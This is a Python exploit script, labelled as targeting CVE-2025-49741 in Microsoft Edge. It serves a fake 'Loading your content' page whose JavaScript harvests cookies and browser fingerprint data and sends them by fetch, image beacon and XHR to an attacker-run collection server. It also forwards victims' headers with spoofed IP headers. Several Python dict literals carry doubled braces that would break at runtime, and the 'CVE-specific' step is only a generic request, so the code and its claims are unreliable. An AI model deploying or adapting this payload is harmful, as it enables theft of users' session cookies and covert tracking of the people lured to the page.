#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2025-49741: Microsoft Edge (Chromium-based) Information Disclosure
Exploit targeting Edge 135.0.7049.114/.115 for information disclosure
"""

import os
import socket
import threading
import time
import base64
import json
import urllib.parse
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from typing import Dict, List, Any, Optional
import logging

logger = logging.getLogger(__name__)


class CVE2025_49741_Exploit:
    """Microsoft Edge Information Disclosure exploit"""
    
    def __init__(self):
        self.config = {
            'kali_ip': '127.0.0.1',
            'malicious_port': 8080,
            'exfil_port': 1337,
            'auto_detect_ip': True,
            'collect_headers': True,
            'collect_user_agent': True,
            'collect_cookies': True,
            'simulate_internal_request': True,
            'mode': 'exploit'  # exploit, recon
        }
        
        self.malicious_server = None
        self.exfil_server = None
        self.malicious_thread = None
        self.exfil_thread = None
        self.collected_data = []
        self.active_sessions = {}
        
    def set_parameter(self, name: str, value: Any):
        """Set exploit parameter"""
        if name in self.config:
            self.config[name] = value
            logger.info(f"Set {name} = {value}")
        else:
            logger.warning(f"Unknown parameter: {name}")
    
    def _get_local_ip(self) -> str:
        """Automatically detect local IP address"""
        try:
            # Connect to external server to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return self.config['kali_ip']
    
    def generate_payload(self) -> str:
        """Generate HTML payload for Edge information disclosure"""
        if self.config['auto_detect_ip']:
            server_ip = self._get_local_ip()
        else:
            server_ip = self.config['kali_ip']
        
        malicious_url = f"http://{server_ip}:{self.config['malicious_port']}"
        exfil_url = f"http://{server_ip}:{self.config['exfil_port']}"
        
        html_payload = f"""<!DOCTYPE html>
<html>
<head>
    <title>Loading Content...</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }}
        .container {{ max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .loader {{ border: 4px solid #f3f3f3; border-top: 4px solid #0078d4; 
                  border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        h2 {{ color: #333; text-align: center; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Please wait...</h2>
        <div class="loader"></div>
        <p style="text-align: center; color: #666;">Loading your content</p>
    </div>
    
    <script>
        // CVE-2025-49741 Edge Information Disclosure Exploit
        (function() {{
            'use strict';
            
            const exfilUrl = '{exfil_url}';
            const maliciousUrl = '{malicious_url}';
            
            // Collect browser information
            const browserInfo = {{
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'unknown',
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            }};
            
            // Collect cookies if available
            let cookies = '';
            try {{
                cookies = document.cookie;
            }} catch(e) {{
                cookies = 'Error reading cookies: ' + e.message;
            }}
            
            // Collect headers via fetch (will be intercepted by server)
            const collectedData = {{
                browserInfo: browserInfo,
                cookies: cookies,
                url: window.location.href,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            }};
            
            // Exfiltrate data
            function exfiltrateData() {{
                // Method 1: Fetch to exfiltration endpoint
                fetch(exfilUrl + '/exfil?data=' + encodeURIComponent(JSON.stringify(collectedData)), {{
                    method: 'GET',
                    mode: 'no-cors',
                    cache: 'no-cache'
                }}).catch(err => {{
                    console.log('Exfiltration attempt completed');
                }});
                
                // Method 2: Image beacon (fallback)
                const img = new Image();
                img.src = exfilUrl + '/beacon?data=' + encodeURIComponent(btoa(JSON.stringify(collectedData)));
                
                // Method 3: Simulate internal request (CVE-2025-49741 specific)
                if ({str(self.config['simulate_internal_request']).lower()}) {{
                    // Create internal request simulation
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', exfilUrl + '/internal', true);
                    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
                    xhr.setRequestHeader('X-Edge-Info', btoa(JSON.stringify(collectedData)));
                    xhr.send();
                }}
            }}
            
            // Execute exfiltration
            exfiltrateData();
            
            // Also send via postMessage if in iframe
            if (window.parent !== window) {{
                window.parent.postMessage(collectedData, '*');
            }}
            
            console.log('[CVE-2025-49741] Information disclosure exploit executed');
        }})();
    </script>
</body>
</html>"""
        return html_payload
    
    class MaliciousRequestHandler(BaseHTTPRequestHandler):
        """Handler for malicious server that serves exploit page"""
        
        def __init__(self, *args, exploit_instance=None, **kwargs):
            self.exploit = exploit_instance
            super().__init__(*args, **kwargs)
        
        def log_message(self, format, *args):
            """Override to use logger"""
            logger.info(f"Malicious Server: {format % args}")
        
        def do_GET(self):
            """Handle GET requests"""
            try:
                # Log victim connection
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                logger.info(f"[CVE-2025-49741] Victim connected from {client_ip}")
                logger.info(f"[CVE-2025-49741] User-Agent: {user_agent}")
                
                # Collect all headers
                headers = dict(self.headers)
                
                # Store session data
                session_id = f"{client_ip}_{int(time.time())}"
                self.exploit.active_sessions[session_id] = {{
                    'ip': client_ip,
                    'user_agent': user_agent,
                    'headers': headers,
                    'timestamp': time.time(),
                    'path': self.path
                }}
                
                # Serve exploit page
                payload = self.exploit.generate_payload()
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(payload.encode('utf-8'))))
                self.send_header('X-Content-Type-Options', 'nosniff')
                self.end_headers()
                self.wfile.write(payload.encode('utf-8'))
                
                # Simulate internal request to exfiltration server
                if self.exploit.config['simulate_internal_request']:
                    self._simulate_internal_request(client_ip, headers)
                    
            except Exception as e:
                logger.error(f"Error in malicious server handler: {e}")
                self.send_error(500, "Internal Server Error")
        
        def _simulate_internal_request(self, client_ip: str, headers: dict):
            """Simulate internal request to exfiltration endpoint"""
            try:
                import urllib.request
                import urllib.parse
                
                exfil_url = f"http://{self.exploit.config['kali_ip']}:{self.exploit.config['exfil_port']}/internal"
                
                # Create request with spoofed headers
                req = urllib.request.Request(exfil_url)
                req.add_header('X-Forwarded-For', client_ip)
                req.add_header('X-Real-IP', client_ip)
                req.add_header('User-Agent', headers.get('User-Agent', 'Edge/135.0'))
                req.add_header('Referer', f"http://{self.exploit.config['kali_ip']}:{self.exploit.config['malicious_port']}")
                
                # Add collected headers
                for header_name, header_value in headers.items():
                    if header_name.lower() not in ['host', 'connection']:
                        req.add_header(f'X-Original-{header_name}', header_value)
                
                # Send request
                urllib.request.urlopen(req, timeout=2)
                logger.info(f"[CVE-2025-49741] Simulated internal request sent")
                
            except Exception as e:
                logger.debug(f"Internal request simulation failed: {e}")
        
        def do_POST(self):
            """Handle POST requests"""
            self.do_GET()
    
    class ExfilRequestHandler(BaseHTTPRequestHandler):
        """Handler for exfiltration server"""
        
        def __init__(self, *args, exploit_instance=None, **kwargs):
            self.exploit = exploit_instance
            super().__init__(*args, **kwargs)
        
        def log_message(self, format, *args):
            """Override to use logger"""
            logger.info(f"Exfil Server: {format % args}")
        
        def do_GET(self):
            """Handle GET requests to exfiltration endpoint"""
            try:
                client_ip = self.client_address[0]
                path = self.path
                
                # Parse query parameters
                parsed = urlparse(path)
                params = parse_qs(parsed.query)
                
                # Extract data from various methods
                exfil_data = None
                
                if 'data' in params:
                    # Method 1: URL parameter
                    try:
                        exfil_data = json.loads(urllib.parse.unquote(params['data'][0]))
                    except:
                        exfil_data = {'raw': params['data'][0]}
                
                elif 'beacon' in path:
                    # Method 2: Image beacon
                    if 'data' in params:
                        try:
                            decoded = base64.b64decode(params['data'][0])
                            exfil_data = json.loads(decoded.decode('utf-8'))
                        except:
                            exfil_data = {'raw_beacon': params['data'][0]}
                
                elif '/internal' in path:
                    # Method 3: Internal request simulation
                    exfil_data = {{
                        'source': 'internal_request',
                        'ip': client_ip,
                        'headers': dict(self.headers),
                        'timestamp': time.time()
                    }}
                
                # Store collected data
                if exfil_data:
                    self.exploit.collected_data.append({{
                        'timestamp': time.time(),
                        'source_ip': client_ip,
                        'data': exfil_data
                    }})
                    
                    logger.info(f"[CVE-2025-49741] Data exfiltrated from {client_ip}")
                    logger.info(f"[CVE-2025-49741] Data: {json.dumps(exfil_data, indent=2)}")
                
                # Send success response
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(b'OK')
                
            except Exception as e:
                logger.error(f"Error in exfil server handler: {e}")
                self.send_error(500, "Internal Server Error")
        
        def do_POST(self):
            """Handle POST requests"""
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                
                try:
                    exfil_data = json.loads(post_data.decode('utf-8'))
                except:
                    exfil_data = {'raw': post_data.decode('utf-8', errors='ignore')}
                
                self.exploit.collected_data.append({{
                    'timestamp': time.time(),
                    'source_ip': self.client_address[0],
                    'data': exfil_data
                }})
                
                logger.info(f"[CVE-2025-49741] POST data received from {self.client_address[0]}")
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
                
            except Exception as e:
                logger.error(f"Error handling POST: {e}")
                self.send_error(500, "Internal Server Error")
    
    def _start_malicious_server(self):
        """Start malicious server thread"""
        try:
            if self.config['auto_detect_ip']:
                self.config['kali_ip'] = self._get_local_ip()
            
            server_address = ('0.0.0.0', self.config['malicious_port'])
            self.malicious_server = HTTPServer(
                server_address,
                lambda *args, **kwargs: self.MaliciousRequestHandler(*args, exploit_instance=self, **kwargs)
            )
            
            logger.info(f"[CVE-2025-49741] Malicious server started on http://{self.config['kali_ip']}:{self.config['malicious_port']}")
            self.malicious_server.serve_forever()
            
        except Exception as e:
            logger.error(f"Error starting malicious server: {e}")
    
    def _start_exfil_server(self):
        """Start exfiltration server thread"""
        try:
            server_address = ('0.0.0.0', self.config['exfil_port'])
            self.exfil_server = HTTPServer(
                server_address,
                lambda *args, **kwargs: self.ExfilRequestHandler(*args, exploit_instance=self, **kwargs)
            )
            
            logger.info(f"[CVE-2025-49741] Exfiltration server started on http://{self.config['kali_ip']}:{self.config['exfil_port']}")
            self.exfil_server.serve_forever()
            
        except Exception as e:
            logger.error(f"Error starting exfil server: {e}")
    
    def start_servers(self) -> bool:
        """Start both servers in separate threads"""
        try:
            # Start malicious server
            self.malicious_thread = threading.Thread(target=self._start_malicious_server, daemon=True)
            self.malicious_thread.start()
            
            # Start exfiltration server
            self.exfil_thread = threading.Thread(target=self._start_exfil_server, daemon=True)
            self.exfil_thread.start()
            
            # Wait a bit for servers to start
            time.sleep(1)
            
            logger.info("[CVE-2025-49741] Both servers started successfully")
            return True
            
        except Exception as e:
            logger.error(f"Error starting servers: {e}")
            return False
    
    def stop_servers(self):
        """Stop both servers"""
        try:
            if self.malicious_server:
                self.malicious_server.shutdown()
            if self.exfil_server:
                self.exfil_server.shutdown()
            logger.info("[CVE-2025-49741] Servers stopped")
        except Exception as e:
            logger.error(f"Error stopping servers: {e}")
    
    def get_collected_data(self) -> List[Dict]:
        """Get all collected data"""
        return self.collected_data.copy()
    
    def get_active_sessions(self) -> Dict:
        """Get active sessions"""
        return self.active_sessions.copy()
    
    def execute_exploit(self, parameters: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute the exploit"""
        if parameters:
            for key, value in parameters.items():
                self.set_parameter(key, value)
        
        if self.config['auto_detect_ip']:
            self.config['kali_ip'] = self._get_local_ip()
        
        success = self.start_servers()
        
        if success:
            malicious_url = f"http://{self.config['kali_ip']}:{self.config['malicious_port']}"
            exfil_url = f"http://{self.config['kali_ip']}:{self.config['exfil_port']}"
            
            return {{
                'success': True,
                'malicious_url': malicious_url,
                'exfil_url': exfil_url,
                'message': f'Exploit servers started. Send victims to: {malicious_url}'
            }}
        else:
            return {{
                'success': False,
                'error': 'Failed to start servers'
            }}


def execute_exploit(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """
    Execute CVE-2025-49741 exploit
    
    Args:
        parameters: Dictionary with exploit parameters:
            - kali_ip: IP address for servers (default: auto-detect)
            - malicious_port: Port for malicious server (default: 8080)
            - exfil_port: Port for exfiltration server (default: 1337)
            - auto_detect_ip: Auto-detect local IP (default: True)
    
    Returns:
        Dictionary with execution results
    """
    exploit = CVE2025_49741_Exploit()
    return exploit.execute_exploit(parameters)
